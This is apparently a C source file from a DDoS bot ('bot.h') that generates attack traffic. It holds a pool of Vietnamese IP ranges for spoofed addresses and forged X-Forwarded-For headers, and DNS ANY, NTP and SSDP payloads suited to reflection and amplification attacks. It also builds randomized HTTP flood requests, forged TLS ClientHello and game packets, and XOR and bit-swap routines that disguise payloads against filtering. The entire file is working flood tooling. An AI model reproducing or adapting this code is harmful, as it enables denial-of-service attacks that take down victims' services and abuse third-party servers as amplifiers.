#include "bot.h"

/* ── VN IP Pool ────────────────────────────────── */
typedef struct { uint32_t base; uint32_t mask; } vn_ip_t;
static const vn_ip_t VN_POOL[] = {
    {0x0ea00000,0xffe00000},{0x0ee00000,0xffe00000},{0x1b400000,0xfff00000},
    {0x2a700000,0xfff00000},{0x71a00000,0xffe00000},{0x71b90000,0xffff0000},
    {0x73480000,0xfff80000},{0x74600000,0xfff00000},{0x75000000,0xfff00000},
    {0x76440000,0xfffc0000},{0x7b100000,0xfff00000},{0x7dd48000,0xffff8000},
    {0xabe00000,0xffe00000},{0xcba20000,0xffff0000},{0x1b480000,0xfff80000},
    {0x73490000,0xffff0000},{0x734a0000,0xfffe0000},{0x734c0000,0xfffc0000},
    {0x73540000,0xfffc0000},{0x74680000,0xfffc0000},{0x75010000,0xffff0000},
    {0x75020000,0xfffe0000},{0x75040000,0xfffc0000},{0xabe80000,0xfffc0000},
    {0x2a010000,0xffff0000},{0x2a710000,0xffff0000},{0x76450000,0xffff0000},
    {0x76460000,0xfffe0000},{0xb7500000,0xffff0000},{0xb7510000,0xffff8000},
    {0x704e0000,0xffff0000},{0x70c50000,0xffff0000},{0x75678000,0xffff8000},
};
#define VN_POOL_SZ (sizeof(VN_POOL)/sizeof(VN_POOL[0]))

uint32_t rand_vn_ip(void)
{
    static __thread unsigned int seed = 0;
    if (!seed) seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    const vn_ip_t *r = &VN_POOL[rand_r(&seed) % VN_POOL_SZ];
    return r->base | (rand_r(&seed) & ~r->mask);
}

static const unsigned char DNS_QUERY[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01";
const unsigned char DNS_ANY_PAYLOAD[] = "\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06govdot\x03com\x00\x00\xFF\x00\x01";
const size_t DNS_ANY_LEN = sizeof(DNS_ANY_PAYLOAD);
static const unsigned char NTP_REQ[] = "\x1b\x00\x00\x00\x00\x00\x00\x00";
static const unsigned char SSDP_REQ[] = "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n";

static const char *UA[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.6778.135 Mobile Safari/537.36",
};
#define UA_N (sizeof(UA)/sizeof(UA[0]))

unsigned char g_payloads[MAX_PAYLOADS][MAX_PAYLOAD];
int g_payload_lens[MAX_PAYLOADS];
int g_total_payloads = 0;

void gen_payloads(void)
{
    unsigned int s = (unsigned int)time(NULL);
    g_total_payloads = 0;
    memcpy(g_payloads[g_total_payloads], DNS_QUERY, sizeof(DNS_QUERY));
    g_payload_lens[g_total_payloads++] = (int)sizeof(DNS_QUERY);
    memcpy(g_payloads[g_total_payloads], DNS_ANY_PAYLOAD, DNS_ANY_LEN);
    g_payload_lens[g_total_payloads++] = (int)DNS_ANY_LEN;
    memcpy(g_payloads[g_total_payloads], NTP_REQ, sizeof(NTP_REQ));
    g_payload_lens[g_total_payloads++] = (int)sizeof(NTP_REQ);
    memcpy(g_payloads[g_total_payloads], SSDP_REQ, sizeof(SSDP_REQ));
    g_payload_lens[g_total_payloads++] = (int)sizeof(SSDP_REQ);
    for (int i = 0; i < MAX_PAYLOADS - 4 && g_total_payloads < MAX_PAYLOADS; i++) {
        int len = 200 + (rand_r(&s) % (MAX_PAYLOAD - 200));
        for (int j = 0; j < len; j++)
            g_payloads[g_total_payloads][j] = (unsigned char)(rand_r(&s) % 256);
        if (rand_r(&s) % 3 == 0) encrypt_payload(g_payloads[g_total_payloads], len);
        if (rand_r(&s) % 2 == 0) obfuscate_payload(g_payloads[g_total_payloads], len);
        g_payload_lens[g_total_payloads++] = len;
    }
}

void gen_http(unsigned char *buf, int *len, const char *host)
{
    unsigned int s = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    const char *methods[] = {"GET", "POST", "HEAD"};
    const char *paths[] = {"/", "/index.html", "/api/v1/status", "/wp-admin/admin-ajax.php",
                           "/assets/app.js", "/images/logo.png", "/favicon.ico", "/api/health", "/graphql"};
    const char *m = methods[rand_r(&s) % 3];
    const char *p = paths[rand_r(&s) % 9];
    char qs[64] = "";
    if (rand_r(&s) % 2) snprintf(qs, sizeof(qs), "?v=%u", rand_r(&s) % 1000000000);
    char xff[64] = "";
    if (rand_r(&s) % 4 == 0) {
        uint32_t vn = rand_vn_ip();
        snprintf(xff, sizeof(xff), "X-Forwarded-For: %d.%d.%d.%d\r\n",
                 (vn >> 24) & 0xFF, (vn >> 16) & 0xFF, (vn >> 8) & 0xFF, vn & 0xFF);
    }
    *len = snprintf((char *)buf, 2048,
                     "%s %s%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                     "Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8\r\n"
                     "Accept-Encoding: gzip, deflate\r\n%s%sConnection: keep-alive\r\n\r\n",
                     m, p, qs, host, UA[rand_r(&s) % UA_N],
                     rand_r(&s) % 2 ? "Cache-Control: no-cache\r\n" : "", xff);
}

void gen_tls_hello(unsigned char *buf, int *len, const char *sni)
{
    unsigned int s = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int pos = 0;
    buf[pos++] = 0x16; buf[pos++] = 0x03; buf[pos++] = 0x01;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    int len_pos = pos; pos += 3;
    int body_start = pos;
    buf[pos++] = 0x03; buf[pos++] = 0x03;
    for (int i = 0; i < 32; i++) buf[pos++] = rand_r(&s) & 0xFF;
    buf[pos++] = 0x00;
    uint16_t cs[] = {0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F};
    buf[pos++] = 0x00; buf[pos++] = (unsigned char)sizeof(cs);
    for (size_t i = 0; i < sizeof(cs) / 2; i++) {
        buf[pos++] = (cs[i] >> 8) & 0xFF;
        buf[pos++] = cs[i] & 0xFF;
    }
    buf[pos++] = 0x01; buf[pos++] = 0x00;
    int ext_start = pos;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    int sni_len = (int)strlen(sni);
    buf[pos++] = 0x00; buf[pos++] = (unsigned char)(sni_len + 3);
    buf[pos++] = 0x00; buf[pos++] = (unsigned char)sni_len;
    memcpy(buf + pos, sni, (size_t)sni_len); pos += sni_len;
    buf[pos++] = 0x00; buf[pos++] = 0x2b; buf[pos++] = 0x00; buf[pos++] = 0x03;
    buf[pos++] = 0x03; buf[pos++] = 0x04; buf[pos++] = 0x00; buf[pos++] = 0x33;
    buf[pos++] = 0x00; buf[pos++] = 0x26; buf[pos++] = 0x00; buf[pos++] = 0x24;
    buf[pos++] = 0x00; buf[pos++] = 0x1d; buf[pos++] = 0x00; buf[pos++] = 0x20;
    for (int i = 0; i < 32; i++) buf[pos++] = rand_r(&s) & 0xFF;
    int ext_len = pos - ext_start - 2;
    buf[ext_start] = (ext_len >> 8) & 0xFF;
    buf[ext_start + 1] = ext_len & 0xFF;
    int body_len = pos - body_start;
    buf[len_pos] = (body_len >> 16) & 0xFF;
    buf[len_pos + 1] = (body_len >> 8) & 0xFF;
    buf[len_pos + 2] = body_len & 0xFF;
    int rec_len = pos - 3;
    buf[3] = (rec_len >> 8) & 0xFF; buf[4] = rec_len & 0xFF;
    *len = pos;
}

void gen_game_pkt(unsigned char *buf, int *len)
{
    unsigned int s = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    buf[0] = 0xFE; buf[1] = 0xFD;
    for (int i = 2; i < 8; i++) buf[i] = rand_r(&s) & 0xFF;
    int extra = (rand_r(&s) % 128) + 16;
    for (int i = 8; i < 8 + extra; i++) buf[i] = rand_r(&s) & 0xFF;
    *len = 8 + extra;
}

void encrypt_payload(unsigned char *buf, int len)
{
    uint8_t key = (uint8_t)(rand() % 256);
    for (int i = 0; i < len; i++) { buf[i] ^= key; key = (uint8_t)((key + 1) % 256); }
}

void obfuscate_payload(unsigned char *buf, int len)
{
    for (int i = 0; i < len; i++) buf[i] = (unsigned char)((buf[i] << 4) | (buf[i] >> 4));
}
